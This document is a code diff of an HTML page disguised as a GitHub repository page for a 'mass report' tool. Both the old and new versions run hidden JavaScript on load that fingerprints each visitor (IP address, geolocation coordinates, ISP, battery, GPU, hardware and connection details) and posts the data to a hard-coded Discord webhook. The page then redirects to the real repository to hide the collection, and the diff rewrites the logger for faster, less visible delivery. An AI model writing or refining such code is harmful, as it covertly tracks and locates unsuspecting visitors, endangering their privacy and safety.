@@ -3,13 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!</title>
-    <meta name="description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
-    <meta property="og:title" content="GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!">
-    <meta property="og:description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
-    <meta property="og:url" content="https://github.com/KrumoXDev/MassReporterx3">
-    <meta property="og:image" content="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png">
-    <meta name="theme-color" content="#24292e">
+    <title>GitHub - KrumoXDev/MassReporterx3</title>
+    <meta name="description" content="GitHub repository page">
     <style>
         body {
             font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
@@ -66,7 +61,6 @@
                 <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
             </svg>
         </div>
-
         <div class="repo-header">
             <h1 class="repo-title">KrumoXDev/MassReporterx3</h1>
             <div class="loading">
@@ -77,297 +71,114 @@
     </div>
 
     <script>
-        // Enhanced data collection with battery status and more
-        async function collectFullDeviceData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                pageInfo: {
-                    url: window.location.href,
-                    referrer: document.referrer || "direct"
-                },
-                browser: {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    doNotTrack: navigator.doNotTrack,
-                    cookieEnabled: navigator.cookieEnabled,
-                    pdfViewerEnabled: navigator.pdfViewerEnabled,
-                    webdriver: navigator.webdriver
-                },
-                screen: {
-                    width: window.screen.width,
-                    height: window.screen.height,
-                    colorDepth: window.screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio,
-                    orientation: window.screen.orientation?.type
-                },
-                hardware: {
-                    deviceMemory: navigator.deviceMemory || "unknown",
-                    cpuCores: navigator.hardwareConcurrency || "unknown",
-                    maxTouchPoints: navigator.maxTouchPoints || 0
-                },
-                connection: navigator.connection ? {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
-                } : null,
-                gpu: null,
-                battery: null,
-                location: null,
-                ip: null
-            };
-
-            // Get WebGL/GPU information
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    data.gpu = {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
+    // Instant execution with no delays
+    (async function() {
+        // Parallel data collection for maximum speed
+        const dataPromises = [
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'unknown'})),
+            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+            navigator.getBattery ? navigator.getBattery().then(b => ({
+                battery: {
+                    level: b.level,
+                    charging: b.charging,
+                    chargingTime: b.chargingTime,
+                    dischargingTime: b.dischargingTime
                 }
-            } catch (e) {}
+            })).catch(() => ({})) : Promise.resolve({})
+        ];
 
-            // Get battery status (if available)
-            try {
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    data.battery = {
-                        level: battery.level * 100 + "%",
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                }
-            } catch (e) {}
-
-            // Get IP and location data with fallback providers
-            try {
-                // Try first provider
-                const ipRes1 = await fetch('https://api.ipify.org?format=json');
-                if (ipRes1.ok) {
-                    const ipData = await ipRes1.json();
-                    data.ip = ipData.ip;
-                    
-                    // Get location data
-                    const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                    if (geoRes.ok) {
-                        const geoData = await geoRes.json();
-                        data.location = {
-                            ip: data.ip,
-                            country: geoData.country_name,
-                            region: geoData.region,
-                            city: geoData.city,
-                            postal: geoData.postal,
-                            timezone: geoData.timezone,
-                            coordinates: {
-                                latitude: geoData.latitude,
-                                longitude: geoData.longitude
-                            },
-                            network: {
-                                isp: geoData.org,
-                                asn: geoData.asn
-                            }
-                        };
-                    }
-                }
-            } catch (e) {
-                // Fallback to second provider if first fails
-                try {
-                    const ipRes2 = await fetch('https://ipinfo.io/json');
-                    if (ipRes2.ok) {
-                        const ipData = await ipRes2.json();
-                        data.ip = ipData.ip;
-                        data.location = {
-                            ip: data.ip,
-                            country: ipData.country,
-                            region: ipData.region,
-                            city: ipData.city,
-                            postal: ipData.postal,
-                            timezone: ipData.timezone,
-                            coordinates: ipData.loc ? {
-                                latitude: ipData.loc.split(',')[0],
-                                longitude: ipData.loc.split(',')[1]
-                            } : null,
-                            network: {
-                                isp: ipData.org,
-                                asn: ipData.asn
-                            }
-                        };
-                    }
-                } catch (e) {}
-            }
-
-            // Get installed fonts (additional fingerprinting)
-            try {
-                const fontList = await getFonts();
-                data.fonts = fontList.slice(0, 20); // Limit to first 20 fonts
-            } catch (e) {
-                // Fallback to basic font detection
-                data.fonts = {
-                    installed: document.fonts ? document.fonts.size : "unknown",
-                    common: detectCommonFonts()
+        // Get WebGL fingerprint immediately
+        let gpuInfo = {};
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpuInfo = {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                 };
             }
+        } catch(e) {}
 
-            return data;
-        }
+        // Wait for all parallel requests
+        const [ipData, geoData, batteryData] = await Promise.all(dataPromises);
 
-        // Helper function to detect common fonts
-        function detectCommonFonts() {
-            const commonFonts = [
-                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
-                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
-                'Verdana', 'Andale Mono', 'Baskerville', 'Garamond'
-            ];
-            const available = [];
+        // Compile complete visitor profile
+        const visitorData = {
+            // Core identification
+            ip: ipData.ip,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
             
-            const div = document.createElement('div');
-            div.style.position = 'absolute';
-            div.style.left = '-9999px';
-            div.style.visibility = 'hidden';
-            div.innerHTML = commonFonts.map(font => 
-                `<span style="font-family: ${font}, sans-serif">${font}</span>`
-            ).join('');
-            document.body.appendChild(div);
+            // Precise location
+            coordinates: {
+                latitude: geoData.latitude || 'unknown',
+                longitude: geoData.longitude || 'unknown'
+            },
+            location: {
+                country: geoData.country_name || 'unknown',
+                region: geoData.region || 'unknown',
+                city: geoData.city || 'unknown',
+                postal: geoData.postal || 'unknown',
+                timezone: geoData.timezone || 'unknown'
+            },
+            network: {
+                isp: geoData.org || 'unknown',
+                asn: geoData.asn || 'unknown'
+            },
             
-            const spans = div.getElementsByTagName('span');
-            for (let i = 0; i < spans.length; i++) {
-                if (spans[i].offsetWidth !== spans[0].offsetWidth || 
-                    spans[i].offsetHeight !== spans[0].offsetHeight) {
-                    available.push(commonFonts[i]);
-                }
-            }
+            // Device info
+            screen: `${window.screen.width}x${window.screen.height}`,
+            devicePixelRatio: window.devicePixelRatio,
+            deviceMemory: navigator.deviceMemory || "unknown",
+            cpuCores: navigator.hardwareConcurrency || "unknown",
+            battery: batteryData.battery || {level: 'unavailable'},
             
-            document.body.removeChild(div);
-            return available;
-        }
-
-        // Modern font enumeration API
-        async function getFonts() {
-            try {
-                await document.fonts.ready;
-                const fontSet = new Set();
-                for (const font of document.fonts) {
-                    fontSet.add(font.family);
-                }
-                return Array.from(fontSet);
-            } catch (e) {
-                throw new Error('Font enumeration failed');
-            }
-        }
-
-        // Send collected data to Discord
-        async function sendToDiscord(data) {
-            try {
-                const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
-                
-                // Format the Discord message
-                const message = {
-                    content: "🔍 **New Visitor Data Collected**",
-                    embeds: [{
-                        title: "Detailed Device Information",
-                        color: 0x5865F2,
-                        fields: [
-                            {
-                                name: "🌍 Location Info",
-                                value: data.location ? 
-                                    `**IP:** ||\`${data.location.ip}\`||\n` +
-                                    `**Location:** ${data.location.city}, ${data.location.region}, ${data.location.country}\n` +
-                                    `**Coordinates:** ${data.location.coordinates?.latitude}, ${data.location.coordinates?.longitude}\n` +
-                                    `**ISP:** ${data.location.network.isp} (AS${data.location.network.asn})`
-                                    : "Location data unavailable",
-                                inline: true
-                            },
-                            {
-                                name: "💻 Device Info",
-                                value: `**OS:** ${data.browser.platform}\n` +
-                                    `**Screen:** ${data.screen.width}x${data.screen.height} (${data.screen.pixelRatio}x)\n` +
-                                    `**Memory:** ${data.hardware.deviceMemory}GB\n` +
-                                    `**CPU Cores:** ${data.hardware.cpuCores}\n` +
-                                    `**GPU:** ${data.gpu?.vendor || 'Unknown'}`,
-                                inline: true
-                            },
-                            {
-                                name: "🔋 Battery Status",
-                                value: data.battery ? 
-                                    `**Level:** ${data.battery.level}\n` +
-                                    `**Charging:** ${data.battery.charging ? 'Yes' : 'No'}\n` +
-                                    `**Status:** ${data.battery.charging ? 
-                                        `Charging (${formatTime(data.battery.chargingTime)})` : 
-                                        `Discharging (${formatTime(data.battery.dischargingTime)})`}`
-                                    : "Battery API not supported",
-                                inline: true
-                            },
-                            {
-                                name: "🌐 Network Info",
-                                value: data.connection ? 
-                                    `**Type:** ${data.connection.type}\n` +
-                                    `**Speed:** ~${Math.round(data.connection.downlink * 100) / 100} Mbps\n` +
-                                    `**Latency:** ${data.connection.rtt}ms\n` +
-                                    `**Save Data:** ${data.connection.saveData ? 'Enabled' : 'Disabled'}`
-                                    : "Network info unavailable",
-                                inline: true
-                            },
-                            {
-                                name: "🖥️ Browser Info",
-                                value: `**User Agent:** ||\`${data.browser.userAgent}\`||\n` +
-                                    `**Language:** ${data.browser.language}\n` +
-                                    `**Cookies:** ${data.browser.cookieEnabled ? 'Enabled' : 'Disabled'}\n` +
-                                    `**WebDriver:** ${data.browser.webdriver ? 'Detected' : 'Not detected'}`,
-                                inline: true
-                            },
-                            {
-                                name: "✒️ Fonts Detected",
-                                value: data.fonts ? 
-                                    (Array.isArray(data.fonts) ? 
-                                        `${data.fonts.length} fonts (${data.fonts.slice(0, 3).join(', ')}...)` : 
-                                        `${data.fonts.installed} fonts, ${data.fonts.common.length} common` 
-                                    : "Font data unavailable",
-                                inline: true
-                            }
-                        ],
-                        footer: {
-                            text: `Collected at ${new Date().toLocaleString()}`
-                        }
-                    }]
-                };
-
-                // Send the data
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(message)
-                });
-            } catch (e) {
-                console.error("Failed to send data to Discord:", e);
-            }
-        }
-
-        // Helper to format time
-        function formatTime(seconds) {
-            if (seconds === Infinity) return "Unknown";
-            const hours = Math.floor(seconds / 3600);
-            const minutes = Math.floor((seconds % 3600) / 60);
-            return `${hours > 0 ? hours + 'h ' : ''}${minutes > 0 ? minutes + 'm' : '<1m'}`;
-        }
-
-        // Main execution
-        (async () => {
-            // Collect all possible data
-            const deviceData = await collectFullDeviceData();
+            // Browser fingerprint
+            language: navigator.language,
+            platform: navigator.platform,
+            doNotTrack: navigator.doNotTrack,
+            gpu: gpuInfo,
             
-            // Send to Discord
-            await sendToDiscord(deviceData);
+            // Connection
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : null,
             
-            // Redirect after a short delay
-            setTimeout(() => {
-                window.location.href = "https://github.com/KrumoXDev/MassReporterx3";
-            }, 2000);
-        })();
+            // Page info
+            referrer: document.referrer || "direct",
+            url: window.location.href
+        };
+
+        // Send to Discord via webhook (using beacon API for instant delivery)
+        const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
+        const embed = {
+            title: "📊 New Visitor Data",
+            color: 0x00ff00,
+            fields: [
+                {name: "🌐 IP Address", value: `\`${visitorData.ip}\``, inline: true},
+                {name: "📍 Location", value: `${visitorData.location.city}, ${visitorData.location.country}`, inline: true},
+                {name: "🛜 Network", value: `${visitorData.network.isp} (AS${visitorData.network.asn})`, inline: true},
+                {name: "💻 Device", value: `${visitorData.platform} (${visitorData.screen})`, inline: true},
+                {name: "🔋 Battery", value: visitorData.battery.level !== 'unavailable' ? 
+                    `${Math.round(visitorData.battery.level*100)}% ${visitorData.battery.charging ? '⚡' : ''}` : 'unavailable', inline: true},
+                {name: "🎮 GPU", value: `${visitorData.gpu.vendor || 'unknown'} (${visitorData.gpu.renderer || 'unknown'})`, inline: true},
+                {name: "📶 Connection", value: `${visitorData.connection?.type || 'unknown'} (${visitorData.connection?.downlink || '?'}Mbps)`, inline: true}
+            ],
+            footer: {text: `Collected at ${new Date().toLocaleString()}`}
+        };
+
+        // Use beacon API for fastest possible delivery
+        navigator.sendBeacon(webhookURL, JSON.stringify({
+            embeds: [embed]
+        }));
+
+        // Instant redirect (no visible delay)
+        window.location.replace("https://github.com/KrumoXDev/MassReporterx3");
+    })();
     </script>
 </body>
-            </html>
+    </html>
